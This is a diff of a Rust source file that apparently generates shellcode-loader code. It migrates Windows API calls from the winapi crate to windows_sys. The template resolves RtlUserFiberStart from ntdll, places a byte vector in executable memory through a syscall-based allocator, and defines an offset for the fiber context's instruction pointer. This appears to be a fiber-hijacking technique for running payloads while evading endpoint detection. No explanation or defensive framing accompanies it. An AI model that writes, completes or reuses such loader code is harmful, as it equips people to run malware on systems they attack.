@@ -16,10 +16,12 @@ type RtlUserFiberStartFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i
         let body = r#"
         const FIBER_CONTEXT_RIP_OFFSET: usize = 0x0F8;
 
-        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
+        let ntdll = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll\0".as_ptr());
         if ntdll.is_null() { return; }
-        let rtl_ptr = winapi::um::libloaderapi::GetProcAddress(ntdll, b"RtlUserFiberStart\0".as_ptr() as *const i8);
-        if rtl_ptr.is_null() { return; }
+        let rtl_ptr = match windows_sys::Win32::System::LibraryLoader::GetProcAddress(ntdll, b"RtlUserFiberStart\0".as_ptr()) {
+            Some(p) => p,
+            None => return,
+        };
 
         let addr = syscall_alloc_exec(&vec);
         if addr.is_null() { return; }
